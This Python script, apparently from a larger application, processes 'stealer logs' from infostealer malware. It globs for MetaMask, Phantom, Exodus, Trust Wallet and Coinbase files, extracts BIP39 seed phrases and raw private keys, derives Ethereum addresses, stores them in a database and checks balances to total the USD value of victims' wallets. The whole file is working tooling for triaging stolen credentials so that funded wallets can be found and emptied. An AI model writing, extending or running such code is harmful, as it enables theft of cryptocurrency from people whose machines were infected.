#!/usr/bin/env python3
"""
Comprehensive Wallet Checker Test Script

This script:
1. Scans all stealer logs for wallet files
2. Extracts mnemonics and private keys
3. Derives addresses from mnemonics
4. Updates database with wallet addresses
5. Tests the wallet balance checker
6. Generates detailed report
"""
import os
import sys
import asyncio
import json
import re
from pathlib import Path
from typing import List, Dict, Any
from datetime import datetime
from decimal import Decimal

# Add app to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from app.database import SessionLocal
from app.models import Wallet, Device
from app.services.wallet_checker import WalletBalanceChecker
from sqlalchemy import func

# Mnemonic validation
from mnemonic import Mnemonic

# Ethereum address derivation
try:
    from eth_account import Account
    from eth_account.hdaccount import generate_mnemonic, seed_from_mnemonic, key_from_seed
    Account.enable_unaudited_hdwallet_features()
except ImportError:
    print("⚠️  Warning: eth-account not properly configured for HD wallets")

class WalletTester:
    """Test wallet checker functionality"""
    
    def __init__(self):
        self.db = SessionLocal()
        self.checker = WalletBalanceChecker()
        self.results = {
            "files_scanned": 0,
            "mnemonics_found": 0,
            "addresses_derived": 0,
            "wallets_updated": 0,
            "balance_checks": 0,
            "wallets_with_balance": 0,
            "total_value_usd": Decimal(0),
            "errors": []
        }
        
    def scan_wallet_files(self, data_dir: str = "data/incoming") -> List[Dict[str, Any]]:
        """Scan all wallet-related files in logs"""
        print("\n🔍 Scanning for wallet files...")
        wallet_data = []
        
        data_path = Path(data_dir)
        if not data_path.exists():
            print(f"❌ Data directory not found: {data_dir}")
            return wallet_data
        
        # Common wallet file patterns
        wallet_patterns = [
            "**/Metamask*",
            "**/Phantom*",
            "**/Exodus*",
            "**/Trust*Wallet*",
            "**/Coinbase*",
            "**/*wallet*.txt",
            "**/*seed*.txt",
            "**/*mnemonic*.txt",
            "**/Wallets/**/*",
        ]
        
        for pattern in wallet_patterns:
            for file_path in data_path.glob(pattern):
                if file_path.is_file():
                    self.results["files_scanned"] += 1
                    try:
                        content = file_path.read_text(encoding='utf-8', errors='ignore')
                        
                        # Extract mnemonics (12 or 24 words)
                        mnemonics = self.extract_mnemonics(content)
                        
                        # Extract private keys
                        private_keys = self.extract_private_keys(content)
                        
                        if mnemonics or private_keys:
                            wallet_data.append({
                                "file_path": str(file_path),
                                "mnemonics": mnemonics,
                                "private_keys": private_keys,
                                "wallet_type": self.detect_wallet_type(file_path)
                            })
                            
                    except Exception as e:
                        self.results["errors"].append(f"Error reading {file_path}: {e}")
        
        print(f"✅ Scanned {self.results['files_scanned']} files")
        return wallet_data
    
    def extract_mnemonics(self, content: str) -> List[str]:
        """Extract valid BIP39 mnemonics from content"""
        mnemonics = []
        mnemo = Mnemonic("english")
        
        # Split by common delimiters
        lines = content.replace('\r', '\n').split('\n')
        
        for line in lines:
            # Clean the line
            words = re.sub(r'[^a-z\s]', '', line.lower()).split()
            
            # Check for 12 or 24 word mnemonics
            for word_count in [12, 24]:
                if len(words) >= word_count:
                    # Try different starting positions
                    for i in range(len(words) - word_count + 1):
                        phrase = ' '.join(words[i:i+word_count])
                        if mnemo.check(phrase):
                            if phrase not in mnemonics:
                                mnemonics.append(phrase)
                                self.results["mnemonics_found"] += 1
        
        return mnemonics
    
    def extract_private_keys(self, content: str) -> List[str]:
        """Extract private keys from content"""
        private_keys = []
        
        # Ethereum private key pattern (64 hex chars, may have 0x prefix)
        eth_pattern = r'(?:0x)?[a-fA-F0-9]{64}'
        
        matches = re.findall(eth_pattern, content)
        for match in matches:
            key = match.lower().replace('0x', '')
            if key not in private_keys and len(key) == 64:
                private_keys.append(key)
        
        return private_keys
    
    def detect_wallet_type(self, file_path: Path) -> str:
        """Detect wallet type from file path"""
        path_str = str(file_path).lower()
        
        if 'metamask' in path_str:
            return 'Metamask'
        elif 'phantom' in path_str:
            return 'Phantom'
        elif 'exodus' in path_str:
            return 'Exodus'
        elif 'trust' in path_str:
            return 'TrustWallet'
        elif 'coinbase' in path_str:
            return 'Coinbase'
        else:
            return 'Unknown'
    
    def derive_addresses(self, wallet_data: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Derive wallet addresses from mnemonics and private keys"""
        print("\n🔐 Deriving wallet addresses...")
        derived_wallets = []
        
        for data in wallet_data:
            wallet_type = data["wallet_type"]
            
            # Derive from mnemonics
            for mnemonic in data["mnemonics"]:
                try:
                    # Derive Ethereum address (works for ETH, MATIC, BNB)
                    acct = Account.from_mnemonic(mnemonic)
                    address = acct.address
                    
                    derived_wallets.append({
                        "wallet_type": wallet_type,
                        "address": address,
                        "source": "mnemonic",
                        "file_path": data["file_path"]
                    })
                    
                    self.results["addresses_derived"] += 1
                    
                    # For BTC, we'd need different derivation
                    # For now, we'll focus on EVM chains
                    
                except Exception as e:
                    self.results["errors"].append(f"Error deriving from mnemonic: {e}")
            
            # Derive from private keys
            for private_key in data["private_keys"]:
                try:
                    acct = Account.from_key(private_key)
                    address = acct.address
                    
                    derived_wallets.append({
                        "wallet_type": wallet_type,
                        "address": address,
                        "source": "private_key",
                        "file_path": data["file_path"]
                    })
                    
                    self.results["addresses_derived"] += 1
                    
                except Exception as e:
                    self.results["errors"].append(f"Error deriving from private key: {e}")
        
        print(f"✅ Derived {len(derived_wallets)} addresses")
        return derived_wallets
    
    def update_database(self, derived_wallets: List[Dict[str, Any]]):
        """Update database with derived wallet addresses"""
        print("\n💾 Updating database...")
        
        # Get or create a test device
        device = self.db.query(Device).first()
        if not device:
            print("⚠️  No devices found in database, creating test device...")
            device = Device(
                device_id="test_device_wallet_checker",
                device_name="Wallet Checker Test Device",
                device_name_hash="test_hash",
                upload_batch="wallet_test"
            )
            self.db.add(device)
            self.db.commit()
            self.db.refresh(device)
        
        # Update or create wallet records
        for wallet_info in derived_wallets:
            # Check if wallet already exists
            existing = self.db.query(Wallet).filter(
                Wallet.address == wallet_info["address"]
            ).first()
            
            if existing:
                # Update existing wallet
                if not existing.address:
                    existing.address = wallet_info["address"]
                    existing.path = wallet_info["file_path"]
                    self.results["wallets_updated"] += 1
            else:
                # Create new wallet
                wallet = Wallet(
                    device_id=device.id,
                    wallet_type=wallet_info["wallet_type"],
                    address=wallet_info["address"],
                    path=wallet_info["file_path"],
                    source_file=Path(wallet_info["file_path"]).name
                )
                self.db.add(wallet)
                self.results["wallets_updated"] += 1
        
        self.db.commit()
        print(f"✅ Updated {self.results['wallets_updated']} wallet records")
    
    async def test_balance_checker(self, limit: int = 20):
        """Test the wallet balance checker"""
        print("\n💰 Testing wallet balance checker...")
        
        # Get wallets with addresses
        wallets_with_addresses = self.db.query(Wallet).filter(
            Wallet.address.isnot(None)
        ).limit(limit).all()
        
        if not wallets_with_addresses:
            print("❌ No wallets with addresses found to test")
            return
        
        print(f"📊 Testing {len(wallets_with_addresses)} wallets...")
        
        wallet_ids = [w.id for w in wallets_with_addresses]
        
        # Test the checker
        results = await self.checker.check_multiple_wallets(
            wallet_ids=wallet_ids,
            batch_size=5,  # Process 5 at a time
            delay=2.0  # 2 second delay between batches to respect rate limits
        )
        
        self.results["balance_checks"] = results["checked"]
        self.results["wallets_with_balance"] = results["with_balance"]
        self.results["total_value_usd"] = results["total_value_usd"]
        
        print(f"\n✅ Balance Check Results:")
        print(f"   Checked: {results['checked']}")
        print(f"   Success: {results['success']}")
        print(f"   Failed: {results['failed']}")
        print(f"   With Balance: {results['with_balance']}")
        print(f"   Total Value: ${results['total_value_usd']:.2f} USD")
        
        # Show wallets with balance
        if results['with_balance'] > 0:
            print(f"\n💎 Wallets with Balance:")
            for result in results['results']:
                if result.get('has_balance'):
                    print(f"   {result['wallet_type']}: {result['address']}")
                    print(f"      Balance: {result.get('balance', 0)} ({result['wallet_type']})")
                    print(f"      USD Value: ${result.get('balance_usd', 0):.2f}")
    
    def generate_report(self):
        """Generate detailed test report"""
        print("\n" + "="*60)
        print("📊 WALLET CHECKER TEST REPORT")
        print("="*60)
        print(f"\n📁 File Analysis:")
        print(f"   Files Scanned: {self.results['files_scanned']}")
        print(f"   Mnemonics Found: {self.results['mnemonics_found']}")
        print(f"   Addresses Derived: {self.results['addresses_derived']}")
        
        print(f"\n💾 Database Updates:")
        print(f"   Wallets Updated: {self.results['wallets_updated']}")
        
        print(f"\n💰 Balance Checks:")
        print(f"   Wallets Checked: {self.results['balance_checks']}")
        print(f"   Wallets with Balance: {self.results['wallets_with_balance']}")
        print(f"   Total Value: ${self.results['total_value_usd']:.2f} USD")
        
        if self.results['errors']:
            print(f"\n⚠️  Errors ({len(self.results['errors'])}):")
            for i, error in enumerate(self.results['errors'][:10], 1):
                print(f"   {i}. {error}")
            if len(self.results['errors']) > 10:
                print(f"   ... and {len(self.results['errors']) - 10} more errors")
        
        print("\n" + "="*60)
        
        # Database statistics
        total_wallets = self.db.query(Wallet).count()
        with_addresses = self.db.query(Wallet).filter(Wallet.address.isnot(None)).count()
        checked_wallets = self.db.query(Wallet).filter(Wallet.last_checked.isnot(None)).count()
        with_balance = self.db.query(Wallet).filter(Wallet.has_balance == True).count()
        
        print(f"\n📊 Current Database Statistics:")
        print(f"   Total Wallets: {total_wallets}")
        print(f"   With Addresses: {with_addresses}")
        print(f"   Checked: {checked_wallets}")
        print(f"   With Balance: {with_balance}")
        
        if with_balance > 0:
            total_value = self.db.query(func.sum(Wallet.balance_usd)).filter(
                Wallet.has_balance == True
            ).scalar() or Decimal(0)
            print(f"   Total Portfolio Value: ${total_value:.2f} USD")
        
        print("="*60 + "\n")
    
    def close(self):
        """Close database connection"""
        self.db.close()


async def main():
    """Main test execution"""
    print("\n" + "="*60)
    print("🧪 WALLET CHECKER COMPREHENSIVE TEST")
    print("="*60)
    
    tester = WalletTester()
    
    try:
        # Step 1: Scan for wallet files
        wallet_data = tester.scan_wallet_files()
        
        if wallet_data:
            # Step 2: Derive addresses
            derived_wallets = tester.derive_addresses(wallet_data)
            
            if derived_wallets:
                # Step 3: Update database
                tester.update_database(derived_wallets)
                
                # Step 4: Test balance checker
                await tester.test_balance_checker(limit=50)
        else:
            print("\n⚠️  No wallet files found in logs")
            print("   Trying to test existing wallets in database...")
            
            # Test any existing wallets
            await tester.test_balance_checker(limit=50)
        
        # Step 5: Generate report
        tester.generate_report()
        
    except Exception as e:
        print(f"\n❌ Error during testing: {e}")
        import traceback
        traceback.print_exc()
    
    finally:
        tester.close()


if __name__ == "__main__":
    asyncio.run(main())
